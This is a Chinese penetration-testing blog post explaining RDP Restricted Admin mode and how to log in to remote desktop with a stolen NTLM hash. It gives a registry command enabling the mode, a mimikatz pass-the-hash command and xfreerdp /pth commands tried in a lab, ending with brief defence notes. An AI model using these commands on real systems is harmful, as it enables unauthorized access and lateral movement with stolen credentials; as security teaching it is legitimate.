---
layout: post
title: 渗透技巧——Pass the Hash with Remote Desktop(Restricted Admin mode)
---

## 0x00 前言
---

在渗透测试中，如果获得了某个用户的NTLM hash，我们可以尝试使用Pass the hash的方法对WMI和SMB服务进行登录，对于远程桌面服务同样可以进行利用。

本文将要介绍开启`Restricted Admin mode`时，使用Pass the hash对远程桌面进行登录的方法

关于Pass the hash的利用可参考之前的文章：

[《域渗透——Pass The Hash的实现》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/)

## 0x01 简介
---

本文将要介绍以下内容：

- Restricted Admin mode介绍
- Pass the Hash with Remote Desktop(Restricted Admin mode)的实现方法


## 0x02 Restricted Admin mode简介
---

官方说明：

https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/


本节参照官方说明，加入个人理解，如果有误，欢迎纠正

Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中

### 适用系统

- Windows 8.1和Windows Server 2012 R2默认支持该功能
- Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351

**注：**

相关资料可参考：

https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997

https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro

### 开启Restricted Admin mode的方法

#### 方法1: 安装补丁3126593

实现原理同下文的方法2(修改注册表)

参考链接：

https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro

#### 方法2： 修改注册表

位置：

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`

新建`DWORD`键值`DisableRestrictedAdmin`，值为`0`，代表开启;值为`1`，代表关闭

对应命令行开启的命令如下：

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

### 使用Restricted Admin mode

客户端命令行：

```
mstsc.exe /restrictedadmin
```

如果当前系统不支持Restricted Admin mode，执行后弹出远程桌面的参数说明，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-6/2-1.png)

如果当前系统支持Restricted Admin mode，执行后弹出远程桌面的登录界面，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-6/2-2.png)

值得注意的是，Restricted Admin mode使用当前Windows登录凭据，不需要输入口令，直接登录即可

**注：**

Server开启Restricted Admin mode时，Client也需要支持Restricted Admin mode

一些资料提到Pass the Hash with Remote Desktop(Restricted Admin mode)适用于Windows 8.1和Windows Server 2012 R2，这个结论并不确切，准确的说，Windows 7和Windows Server 2008 R2安装补丁后同样适用


## 0x03 Pass the Hash with Remote Desktop(Restricted Admin mode)的实现方法
---

测试环境：

Server：

- OS: Server2012 R2
- IP: 192.168.62.136
- Computer Name: remoteserver
- User Name: administrator
- NTLM hash: d25ecd13fddbb542d2e16da4f9e0333d
- 开启Restricted Admin mode

Client:

- 支持Restricted Admin mode

### 方法1： mimikatz

实际上为`Overpass-the-hash`

需要管理员权限

mimikatz命令如下：

```
privilege::debug
sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d "/run:mstsc.exe /restrictedadmin"
```

执行后弹出远程登录界面，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-6/3-1.png)

选择`连接`，成功实现远程登录

### 方法2： FreeRDP

下载地址：

https://github.com/FreeRDP

可供参考的文章：

https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/

https://www.kali.org/penetration-testing/passing-hash-remote-desktop/

FreeRDP实现了远程桌面协议，支持传入hash

支持Linux、Windows和MAC，下载地址如下：

https://github.com/FreeRDP/FreeRDP/wiki/PreBuilds

#### 实际测试：

(1)linux下使用明文远程登录的参数：

```
xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore
```

测试成功

(2)linux下使用hash远程登录的参数：

```
xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore
```

测试失败

Windows下也是同样的测试结果

猜测FreeRDP移除了该功能，其他人也有同样的测试结果，链接如下：

https://nullsec.us/rdp-sessions-with-xfreerdp-using-pth/

https://twitter.com/egyp7/status/776053410231558148

#### 解决方法：

包含pth功能的旧版FreeRDP的的下载地址：

https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz

需要重新编译，支持pth参数

## 0x04 防御检测
---

Restricted Admin mode本来是为了提高系统的安全性，但是却支持了Pass the Hash的利用

所以在防御上，针对Pass the Hash的利用进行防御就好，开启Restricted Admin mode有助于提高系统的安全性

可参考微软官方文档，地址如下：

http://www.microsoft.com/en-us/download/details.aspx?id=36036

## 0x05 小结
---

本文介绍了特定条件下(Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode)Pass the Hash with Remote Desktop的方法，对Restricted Admin mode的关键部分进行了说明。

关于Pass the Hash with Remote Desktop的通用方法将在之后的文章进行介绍。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



